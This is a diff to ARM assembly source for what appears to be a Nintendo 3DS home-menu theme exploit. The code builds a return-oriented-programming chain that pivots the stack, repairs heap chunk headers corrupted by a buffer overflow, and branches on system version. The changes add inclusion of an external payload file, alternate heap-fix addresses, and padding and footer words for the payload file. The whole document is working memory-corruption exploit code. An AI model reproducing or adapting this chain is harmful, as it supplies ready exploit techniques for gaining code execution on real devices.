@@ -239,6 +239,11 @@ themeheader:
 .incbin THEMEDATA_PATH
 #endif
 #else
+
+#ifdef PAYLOAD_HEADERFILE
+.incbin PAYLOAD_HEADERFILE
+#endif
+
 .word POP_R0PC @ Stack-pivot to ropstackstart.
 .word HEAPBUF + (object - _start) @ r0
 
@@ -452,18 +457,20 @@ rop_ret2menu_stack_newlrval:
 
 .word ROP_STR_R1TOR0 @ Write the new LR value to the stack.
 
-@ Restore the heap freemem memchunk header following the buffer on the heap, to what it was prior to being overwritten @ theme decompression.
-ROPMACRO_WRITEWORD (HEAPBUF+0x2a0000 + 0x8), 0x0
-ROPMACRO_WRITEWORD (HEAPBUF+0x2a0000 + 0xc), 0x0
+@ Restore the heap freemem memchunk header following the buffer on the heap, to what it was prior to being overwritten @ buf overflow.
+#ifdef FIXHEAPBUF
+ROPMACRO_WRITEWORD (FIXHEAPBUF+0x2a0000 + 0x8), 0x0
+ROPMACRO_WRITEWORD (FIXHEAPBUF+0x2a0000 + 0xc), 0x0
 
 @ Write the below value to a heapctx state ptr, which would've been the addr value located there if the memchunk wasn't overwritten, after the memfree was done.
-ROPMACRO_WRITEWORD (HEAPBUF-0x80+0x40002c + 0x3c + 0x4), (HEAPBUF-0x58)
+ROPMACRO_WRITEWORD (FIXHEAPBUF-0x80+0x40002c + 0x3c + 0x4), (HEAPBUF-0x58)
 
 @ Write the below value to a freemem memchunk header ptr, which would've been the addr value located there if the memchunk wasn't overwritten(the one targeted in the buf overflow), after the memfree  was done.
 #if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)//Check for system-version <v9.6.
-ROPMACRO_WRITEWORD (HEAPBUF-0x80 + (0x10+0xc)), 0x0
+ROPMACRO_WRITEWORD (FIXHEAPBUF-0x80 + (0x10+0xc)), 0x0
 #else
-ROPMACRO_WRITEWORD (HEAPBUF-0x80 + (0x28+0xc)), 0x0
+ROPMACRO_WRITEWORD (FIXHEAPBUF-0x80 + (0x28+0xc)), 0x0
+#endif
 #endif
 
 #ifdef LOADOTHER_THEMEDATA
@@ -1021,4 +1028,12 @@ codedataend:
 
 .align 4
 _end:
+
+#ifdef PAYLOAD_PADFILESIZE
+.space (0x150000 - (_end - _start))
+#endif
+
+#ifdef PAYLOAD_FOOTER_WORDS
+.word PAYLOAD_FOOTER_WORD0, PAYLOAD_FOOTER_WORD1, PAYLOAD_FOOTER_WORD2, PAYLOAD_FOOTER_WORD3
+#endif
 
